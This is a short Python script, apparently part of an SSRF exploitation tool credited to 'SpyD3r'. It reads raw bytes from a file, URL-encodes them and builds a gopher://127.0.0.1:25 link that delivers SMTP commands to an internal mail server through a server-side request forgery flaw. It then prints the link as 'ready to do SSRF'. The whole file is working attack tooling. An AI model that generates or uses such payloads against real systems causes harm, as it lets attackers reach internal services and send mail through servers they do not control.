import urllib.parse

def get_payload(payload):
    finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/")
    return "gopher://127.0.0.1:25/_" + finalpayload

def PlainText(filename):
    payload = b''
    with open(filename, 'rb') as f:
        for line in f:
            payload += line
    
    print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
    print("\033[04m" + get_payload(payload)+ "\033[0m")
    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
    pass